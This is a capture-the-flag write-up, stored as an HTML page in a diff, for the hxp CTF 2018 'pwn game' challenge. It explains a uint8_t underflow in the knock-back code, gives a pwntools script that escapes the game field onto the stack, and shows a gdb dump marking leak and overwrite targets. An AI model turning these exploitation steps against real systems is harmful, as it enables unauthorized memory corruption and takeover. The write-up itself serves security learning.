@@ -1,0 +1,801 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>hxp CTF 2018 - pwn game | kileak</title>
+
+
+
+
+
+<meta name="description" content="hxp CTF 2018 - pwn game">
+
+
+<meta name="keywords" content="hxp,pwn game">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2018/hxp18-pwn_game/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">hxp CTF 2018 - pwn game</h1>
+      <p class="post-meta">Dec 8, 2018</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>hxp CTF 2018 - pwn game
+<!--break--></p>
+
+  <p>Connect to the game and play… or pwn… or both! Instructions for the game can be found in the game itself.</p>
+
+  <p>Download:
+pwn game-fd561b730951afff.tar.xz</p>
+
+  <p>Connection:
+stty -icanon min 1 time 0 &amp;&amp; nc 195.201.127.177 9999</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/pwngame/challenge">challenge</a> <a href="https://kileak.github.io/assets/pwngame/challenge.c">challenge.c</a> <a href="https://kileak.github.io/assets/pwngame/libc-2.24.so">libc-2.24.so</a> <a href="https://kileak.github.io/assets/pwngame/xpl.py">xpl.py</a></p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">╔══════════════════════════════╗
+║:O 52 51 54 54 53 50 54 52 52 ║
+║51 52 53 52 53 51 50 50 53 50 ║
+║52 50 52 52 51 51 54 52 51 51 ║
+║50 54 54 53 54 50 52 50 53 53 ║
+║53 53 52 54 54 51 51 54 53 54 ║
+║50 51 50 52 52 Oo 50 52 54 52 ║
+║51 50 52 53 53 52 51 54 53 51 ║
+║52 51 53 51 54 50 54 54 51 51 ║
+║54 52 52 51 50 51 53 53 54 54 ║
+║51 51 50 52 50 51 52 50 54 54 ║
+╚══════════════════════════════╝
+Lifes: ooo      Score: 500     Position: (5, 5)
+CURRENT CELL: 53 -&gt; 50
+================== CONTROLS: ===================
+&lt;w/a/s/d&gt;: MOVE         &lt;q&gt;: QUIT
+&lt;+/-&gt;: INC/DEC 1        &lt;1/2&gt;: INC/DEC 0x10
+&lt;r&gt;: SHOW REAL FIELD    &lt;t&gt;: SHOW TARGET FIELD
+&lt;h&gt;: TOGGLE HEADLESS    &lt;f&gt;: RENDER SINGLE IMAGE</code></pre></figure>
+
+<p>This challenge introduced a game, where you could change cell values, while a monster is chasing you around the gamefield :)</p>
+
+<p>For “winning” this, you’d have to match all values with some random target values, but well, winning this game would lead us nowhere near a flag, so we have to find a way to do something out of the ordinary.</p>
+
+<p>So first, let’s take a look at the source code, hxp provided…</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">player</span> <span class="p">{</span>
+  <span class="kt">uint8_t</span> <span class="n">prev_render_pos_x</span><span class="p">;</span>
+  <span class="kt">uint8_t</span> <span class="n">prev_render_pos_y</span><span class="p">;</span>
+  <span class="kt">uint8_t</span> <span class="n">pos_x</span><span class="p">;</span>
+  <span class="kt">uint8_t</span> <span class="n">pos_y</span><span class="p">;</span>
+  <span class="kt">uint64_t</span> <span class="n">score</span><span class="p">;</span>
+  <span class="kt">uint8_t</span> <span class="n">lifes</span><span class="p">;</span>
+  <span class="kt">int8_t</span> <span class="n">dx</span><span class="p">;</span>
+  <span class="kt">int8_t</span> <span class="n">dy</span><span class="p">;</span>
+<span class="p">};</span></code></pre></figure>
+
+<p>The game will hold the information about the current position (and other stuff) in this struct. Should be noted, that <code class="language-plaintext highlighter-rouge">uint8_t</code> is used for both <code class="language-plaintext highlighter-rouge">x</code> and <code class="language-plaintext highlighter-rouge">y</code> values.</p>
+
+<p>Whenever the player executes an action, like moving or changing cell values, the monster will also update its action. It has a cooldown, so it always pauses for three steps and then moves towards the player direction. If it hits you, you will be knocked back on cell and lose one life.</p>
+
+<p>Well, we have a game field on the stack… A monster knocking us back one cell… There should be a way to abuse this, to get outside of the game field.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">damage_and_knock_back</span><span class="p">(</span><span class="k">struct</span> <span class="n">enemy</span><span class="o">*</span> <span class="n">e</span><span class="p">,</span> <span class="k">struct</span> <span class="n">player</span><span class="o">*</span> <span class="n">p</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">if</span><span class="p">((</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">pos_x</span> <span class="o">==</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">pos_x</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">pos_y</span> <span class="o">==</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">pos_y</span><span class="p">))</span>
+  <span class="p">{</span>
+    <span class="n">p</span><span class="o">-&gt;</span><span class="n">lifes</span><span class="o">--</span><span class="p">;</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">dx</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">pos_x</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">&lt;</span> <span class="n">X_MAX</span><span class="p">)</span>
+      <span class="n">p</span><span class="o">-&gt;</span><span class="n">pos_x</span><span class="o">++</span><span class="p">;</span>
+    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">dx</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">pos_x</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">&gt;=</span> <span class="n">X_MIN</span><span class="p">)</span>     
+      <span class="n">p</span><span class="o">-&gt;</span><span class="n">pos_x</span><span class="o">--</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">dy</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">pos_y</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">&lt;</span> <span class="n">Y_MAX</span><span class="p">)</span>
+      <span class="n">p</span><span class="o">-&gt;</span><span class="n">pos_y</span><span class="o">++</span><span class="p">;</span>
+    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">dy</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">pos_y</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">&gt;=</span> <span class="n">Y_MIN</span><span class="p">)</span>      
+      <span class="n">p</span><span class="o">-&gt;</span><span class="n">pos_y</span><span class="o">--</span><span class="p">;</span>                     
+  <span class="p">}</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>On a first glance, everything seems fine. It will check, if a knockback would put us outside of <code class="language-plaintext highlighter-rouge">X_MIN</code>, <code class="language-plaintext highlighter-rouge">X_MAX</code>, <code class="language-plaintext highlighter-rouge">Y_MIN</code>, <code class="language-plaintext highlighter-rouge">Y_MAX</code> and only move the player, if its new position will still be in boundaries.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">dy</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">pos_y</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">&gt;=</span> <span class="n">Y_MIN</span><span class="p">)</span>      
+      <span class="n">p</span><span class="o">-&gt;</span><span class="n">pos_y</span><span class="o">--</span><span class="p">;</span>                     </code></pre></figure>
+
+<p>Well, except that the player position <code class="language-plaintext highlighter-rouge">x</code> and <code class="language-plaintext highlighter-rouge">y</code> values are stored as <code class="language-plaintext highlighter-rouge">uint_8</code>, which means they are susceptible for an underflow.</p>
+
+<p>If the player is on <code class="language-plaintext highlighter-rouge">y = 0</code> and the monster would hit us from below, <code class="language-plaintext highlighter-rouge">p-&gt;pos_y - 1</code> will evaluate to <code class="language-plaintext highlighter-rouge">0 - 1</code>, which will wrap around <code class="language-plaintext highlighter-rouge">uint_8</code> and become <code class="language-plaintext highlighter-rouge">255</code>, which is bigger than <code class="language-plaintext highlighter-rouge">Y_MIN</code>. So, this will lead to an <code class="language-plaintext highlighter-rouge">y</code> position of <code class="language-plaintext highlighter-rouge">255</code> and we’ll be out of the gamefield. By this, we’ll get put way behind the game field and can walk through the stack (between the current gamefield and <code class="language-plaintext highlighter-rouge">gamefield+(255*10)</code>).</p>
+
+<p>With the ability to walk around on the stack, still seeing <code class="language-plaintext highlighter-rouge">CURRENT CELL</code> values and the possibility to modify current cell values, we can for one leak arbitrary stack values and also modify them.</p>
+
+<p>Though… The monster will still be chasing us, which makes the whole procedere a little bit troublesome. But first, let’s get a starter script to get into the initial exploit stage by walking outside of the game field.</p>
+
+<p>In the original exploit, I obviously didn’t track current monster position, but just <em>tried to get it right</em>. For the writeup, I decided to clean this up a bit and use proper <code class="language-plaintext highlighter-rouge">move</code> functions, which will also update all game informations, so we always know, where the monster is currently located and more important its distance to the player (this will come in handy later on).</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">math</span>
+
+<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"195.201.127.177"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">9999</span>
+
+<span class="c1"># Player information
+</span><span class="n">PLAYER_X</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
+<span class="n">PLAYER_Y</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
+<span class="n">CURRENT</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
+<span class="n">DEST</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
+
+<span class="c1"># Monster information
+</span><span class="n">ENEMY_X</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">ENEMY_Y</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">ENEMY_COOLDOWN</span> <span class="o">=</span> <span class="mi">5</span>
+<span class="n">ENEMY_DISTANCE</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="s">"""
+Recalculate new monster position and distance to player.
+"""</span>
+<span class="k">def</span> <span class="nf">move_enemy</span><span class="p">():</span>
+  <span class="k">global</span> <span class="n">PLAYER_X</span><span class="p">,</span> <span class="n">PLAYER_Y</span><span class="p">,</span> <span class="n">ENEMY_X</span><span class="p">,</span> <span class="n">ENEMY_Y</span><span class="p">,</span> <span class="n">ENEMY_COOLDOWN</span><span class="p">,</span> <span class="n">ENEMY_DISTANCE</span>
+
+  <span class="k">if</span> <span class="n">ENEMY_COOLDOWN</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>    
+    <span class="c1"># Calculate new monster pos and distance
+</span>    <span class="n">EDX</span> <span class="o">=</span> <span class="p">(</span><span class="n">PLAYER_X</span> <span class="o">-</span> <span class="n">ENEMY_X</span><span class="p">)</span> 
+    <span class="n">EDY</span> <span class="o">=</span> <span class="p">(</span><span class="n">PLAYER_Y</span> <span class="o">-</span> <span class="n">ENEMY_Y</span><span class="p">)</span> 
+
+    <span class="n">ENEMY_X</span> <span class="o">+=</span> <span class="mi">1</span> <span class="k">if</span> <span class="n">EDX</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="k">else</span> <span class="o">-</span><span class="mi">1</span>
+    <span class="n">ENEMY_Y</span> <span class="o">+=</span> <span class="mi">1</span> <span class="k">if</span> <span class="n">EDY</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="k">else</span> <span class="o">-</span><span class="mi">1</span>
+
+    <span class="n">ENEMY_DISTANCE</span> <span class="o">=</span> <span class="n">math</span><span class="p">.</span><span class="n">sqrt</span><span class="p">((</span><span class="n">EDX</span><span class="o">*</span><span class="n">EDX</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">EDY</span><span class="o">*</span><span class="n">EDY</span><span class="p">))</span>
+
+  <span class="k">if</span> <span class="n">ENEMY_COOLDOWN</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+    <span class="n">ENEMY_COOLDOWN</span> <span class="o">=</span> <span class="mi">6</span>
+
+  <span class="n">ENEMY_COOLDOWN</span> <span class="o">-=</span> <span class="mi">1</span>
+
+<span class="s">"""
+Move player in specified direction and update monster info.
+"""</span>
+<span class="k">def</span> <span class="nf">move</span><span class="p">(</span><span class="n">direction</span><span class="p">):</span>
+  <span class="k">global</span> <span class="n">PLAYER_X</span><span class="p">,</span> <span class="n">PLAYER_Y</span>
+
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">direction</span><span class="p">)</span>
+
+  <span class="k">if</span> <span class="n">direction</span> <span class="o">==</span> <span class="s">"w"</span><span class="p">:</span>
+    <span class="n">PLAYER_Y</span> <span class="o">-=</span> <span class="mi">1</span>
+  <span class="k">elif</span> <span class="n">direction</span> <span class="o">==</span> <span class="s">"s"</span><span class="p">:</span>
+    <span class="n">PLAYER_Y</span> <span class="o">+=</span> <span class="mi">1</span>
+  <span class="k">elif</span> <span class="n">direction</span> <span class="o">==</span> <span class="s">"a"</span><span class="p">:</span>
+    <span class="n">PLAYER_X</span> <span class="o">-=</span> <span class="mi">1</span>
+  <span class="k">elif</span> <span class="n">direction</span> <span class="o">==</span> <span class="s">"d"</span><span class="p">:</span>
+    <span class="n">PLAYER_X</span> <span class="o">+=</span> <span class="mi">1</span>
+
+  <span class="n">move_enemy</span><span class="p">()</span>
+  
+<span class="s">"""
+Parse current game state.
+"""</span>
+<span class="k">def</span> <span class="nf">parse_screen</span><span class="p">():</span>
+  <span class="k">global</span> <span class="n">ENEMY_X</span><span class="p">,</span> <span class="n">ENEMY_Y</span><span class="p">,</span> <span class="n">PLAYER_X</span><span class="p">,</span> <span class="n">PLAYER_Y</span><span class="p">,</span> <span class="n">CURRENT</span><span class="p">,</span> <span class="n">DEST</span><span class="p">,</span> <span class="n">ENEMY_DISTANCE</span>
+
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"f"</span><span class="p">)</span>
+
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Position: ("</span><span class="p">)</span>
+  <span class="n">PLAYER_X</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">", "</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">))</span>
+  <span class="n">PLAYER_Y</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">")"</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">))</span>
+
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"CURRENT CELL: "</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+  <span class="n">CURRENT</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="s">"0x"</span><span class="o">+</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">" "</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">" "</span><span class="p">)</span>
+  <span class="n">DEST</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="s">"0x"</span><span class="o">+</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"PLAYER_X: %d / PLAYER_Y: %d / ENEMY_X: %d / ENEMY_Y: %d / ENEMY_DISTANCE: %d / Cur: %s / Dest: %s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">PLAYER_X</span><span class="p">,</span> <span class="n">PLAYER_Y</span><span class="p">,</span> <span class="n">ENEMY_X</span><span class="p">,</span> <span class="n">ENEMY_Y</span><span class="p">,</span> <span class="n">ENEMY_DISTANCE</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">CURRENT</span><span class="p">),</span> <span class="nb">hex</span><span class="p">(</span><span class="n">DEST</span><span class="p">)))</span>
+
+<span class="s">"""
+Enter headless mode.
+"""</span>
+<span class="k">def</span> <span class="nf">go_headless</span><span class="p">():</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"HEADLESS...</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"h"</span><span class="p">)</span>
+  <span class="n">parse_screen</span><span class="p">()</span>
+  
+<span class="s">"""
+Initialize exploit by moving out of gamefield.
+"""</span>
+<span class="k">def</span> <span class="nf">init_exploit_state</span><span class="p">():</span>
+  <span class="k">global</span> <span class="n">ENEMY_X</span><span class="p">,</span> <span class="n">ENEMY_Y</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Starting game, go out of bounds"</span><span class="p">)</span>
+
+  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">11</span><span class="p">):</span>
+    <span class="n">move</span><span class="p">(</span><span class="s">"d"</span><span class="p">)</span>   
+
+  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">11</span><span class="p">):</span>
+    <span class="n">move</span><span class="p">(</span><span class="s">"w"</span><span class="p">)</span>
+
+  <span class="n">move</span><span class="p">(</span><span class="s">"w"</span><span class="p">)</span>
+  
+  <span class="n">ENEMY_X</span> <span class="o">=</span> <span class="mi">9</span>
+  <span class="n">ENEMY_Y</span> <span class="o">=</span> <span class="mi">255</span>
+
+  <span class="n">parse_screen</span><span class="p">()</span>
+  
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+  <span class="k">global</span> <span class="n">PIELEAK</span>
+
+  <span class="n">go_headless</span><span class="p">()</span> 
+
+  <span class="n">init_exploit_state</span><span class="p">()</span>  
+
+  <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+  
+  <span class="k">return</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+  <span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./challenge"</span><span class="p">)</span>
+  <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc-2.24.so"</span><span class="p">)</span>
+
+  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">False</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+    <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+  <span class="k">else</span><span class="p">:</span>
+    <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./challenge"</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">"LD_PRELOAD"</span> <span class="p">:</span> <span class="s">"./libc-2.24.so"</span><span class="p">})</span>
+    <span class="k">print</span> <span class="n">util</span><span class="p">.</span><span class="n">proc</span><span class="p">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+    <span class="n">pause</span><span class="p">()</span>
+    <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span></code></pre></figure>
+
+<p>So, by now, we’ll just walk to <code class="language-plaintext highlighter-rouge">9 / 0</code> and walk into the wall until the monster catches up (from below) and kicks us out of the gamefield.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">╔══════════════════════════════╗
+║53 52 51 54 54 53 50 54 52 52 ║
+║51 52 53 52 53 51 50 50 53 50 ║
+║52 50 52 52 51 51 54 52 51 51 ║
+║50 54 54 53 54 50 52 50 53 53 ║
+║53 53 52 54 54 51 51 54 53 54 ║
+║50 51 50 52 52 53 50 52 54 52 ║
+║51 50 52 53 53 52 51 54 53 51 ║
+║52 51 53 51 54 50 54 54 51 51 ║
+║54 52 52 51 50 51 53 53 54 54 ║
+║51 51 50 52 50 51 52 50 54 54 ║
+╚══════════════════════════════╝
+Lifes: oo       Score: 477     Position: (9, 254)
+CURRENT CELL: 00 -&gt; 00
+================== CONTROLS: ===================
+&lt;w/a/s/d&gt;: MOVE         &lt;q&gt;: QUIT
+&lt;+/-&gt;: INC/DEC 1        &lt;1/2&gt;: INC/DEC 0x10
+&lt;r&gt;: SHOW REAL FIELD    &lt;t&gt;: SHOW TARGET FIELD
+&lt;h&gt;: TOGGLE HEADLESS    &lt;f&gt;: RENDER SINGLE IMAGE
+
+
+
+
+
+
+
+
+                            Oo                       &lt;= Player out of bounds :)  </code></pre></figure>
+
+<p>From here we can walk <code class="language-plaintext highlighter-rouge">left</code>, <code class="language-plaintext highlighter-rouge">right</code> and up. Since <code class="language-plaintext highlighter-rouge">y</code> is now <code class="language-plaintext highlighter-rouge">&gt; Y_MAX</code>, no down movement is possible anymore, but we won’t need that anyways. Since we deal with <code class="language-plaintext highlighter-rouge">PIE</code> and <code class="language-plaintext highlighter-rouge">ASLR</code>, it’s time now to leak some addresses.</p>
+
+<p>For the sake of simplicity, let’s just think about non <code class="language-plaintext highlighter-rouge">ASLR</code> addresses here, since everything in the binary will be calculated in offsets to the game field anyways.</p>
+
+<p>On my machine, the real game field started at <code class="language-plaintext highlighter-rouge">0x7fffffffe440</code>, so we can calculate the needed <code class="language-plaintext highlighter-rouge">x</code>, <code class="language-plaintext highlighter-rouge">y</code> offsets based on the distance from this address.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># Non ASLR address used for easier calculating offsets
+</span><span class="n">REAL_FIELD</span> <span class="o">=</span> <span class="mh">0x7fffffffe440</span>
+
+<span class="s">"""
+Move player to specific x/y coordinates.
+"""</span>
+<span class="k">def</span> <span class="nf">goto_xy</span><span class="p">(</span><span class="n">dest_x</span><span class="p">,</span> <span class="n">dest_y</span><span class="p">):</span>
+  <span class="k">global</span> <span class="n">PLAYER_X</span><span class="p">,</span> <span class="n">PLAYER_Y</span>
+
+  <span class="k">while</span> <span class="p">(</span><span class="n">dest_y</span> <span class="o">!=</span> <span class="n">PLAYER_Y</span><span class="p">):</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">dest_y</span> <span class="o">&lt;</span> <span class="n">PLAYER_Y</span><span class="p">):</span>   
+      <span class="n">move</span><span class="p">(</span><span class="s">"w"</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="p">(</span><span class="n">dest_y</span> <span class="o">&gt;</span> <span class="n">PLAYER_Y</span><span class="p">):</span>
+      <span class="n">move</span><span class="p">(</span><span class="s">"s"</span><span class="p">)</span>
+
+  <span class="k">while</span> <span class="p">(</span><span class="n">dest_x</span> <span class="o">!=</span> <span class="n">PLAYER_X</span><span class="p">):</span>   
+    <span class="k">if</span> <span class="p">(</span><span class="n">dest_x</span> <span class="o">&lt;</span> <span class="n">PLAYER_X</span><span class="p">):</span>
+      <span class="n">move</span><span class="p">(</span><span class="s">"a"</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="p">(</span><span class="n">dest_x</span> <span class="o">&gt;</span> <span class="n">PLAYER_X</span><span class="p">):</span>
+      <span class="n">move</span><span class="p">(</span><span class="s">"d"</span><span class="p">)</span>
+
+<span class="s">"""
+Move player to start of specific address on stack.
+"""</span>
+<span class="k">def</span> <span class="nf">goto_address</span><span class="p">(</span><span class="n">address</span><span class="p">):</span>
+  <span class="c1"># calculate dest PLAYER_X/PLAYER_Y  
+</span>  <span class="n">dest_x</span> <span class="o">=</span> <span class="p">(</span><span class="n">address</span> <span class="o">-</span> <span class="n">REAL_FIELD</span><span class="p">)</span> <span class="o">%</span> <span class="mi">10</span>
+  <span class="n">dest_y</span> <span class="o">=</span> <span class="p">(</span><span class="n">address</span> <span class="o">-</span> <span class="n">REAL_FIELD</span><span class="p">)</span> <span class="o">/</span> <span class="mi">10</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Goto address %s : %d / %d"</span> <span class="o">%</span> <span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">address</span><span class="p">),</span> <span class="n">dest_x</span><span class="p">,</span> <span class="n">dest_y</span><span class="p">))</span>
+
+  <span class="n">goto_xy</span><span class="p">(</span><span class="n">dest_x</span><span class="p">,</span> <span class="n">dest_y</span><span class="p">)</span></code></pre></figure>
+
+<p>Now, let’s take a look at the stack, to get an idea, where we want to move and leak</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ x/60gx 0x7fffffffe440-0x40
+0x7fffffffe400: 0x0000000000000000  0x00010a0000000000
+0x7fffffffe410: 0xfe00ff09ff090000  0x00007fffffffe440
+0x7fffffffe420: 0x00000000fe09fe09  0x00000000000001dd &lt;= Player struct
+0x7fffffffe430: 0x0000000000000002  0x0000000000000000
+0x7fffffffe440: 0x5450535454515253  0x5153525352515252 &lt;= Real gamefield starts
+0x7fffffffe450: 0x5252505250535050  0x5450515152545151
+0x7fffffffe460: 0x5353505250545354  0x5451515454525353
+0x7fffffffe470: 0x5352525051505453  0x5352505152545250
+0x7fffffffe480: 0x5152515354515253  0x5151545450545153
+0x7fffffffe490: 0x5353515051525254  0x5150525051515454
+0x7fffffffe4a0: 0x00007fff54545052  0x00007ffff7dd0440 &lt;= ___ / _IO_file_jumps
+0x7fffffffe4b0: 0x5454505352505250  0x5451515451505452 &lt;= Target gamefield starts
+0x7fffffffe4c0: 0x5251515452515453  0x5053505252545152
+0x7fffffffe4d0: 0x5353515353545352  0x5351535351525152
+0x7fffffffe4e0: 0x5054505151515350  0x5151505253525150
+0x7fffffffe4f0: 0x5452535452535150  0x5151505051535350
+0x7fffffffe500: 0x5454515354545452  0x5050545254525353
+0x7fffffffe510: 0x00007fff54505154  0x549f458419fe0c00
+0x7fffffffe520: 0x00007fffffffed70  0x00005555555565e0 &lt;= ___ / main_loop return address
+0x7fffffffe530: 0x00007fffffffee58  0x0000000100000000</code></pre></figure>
+
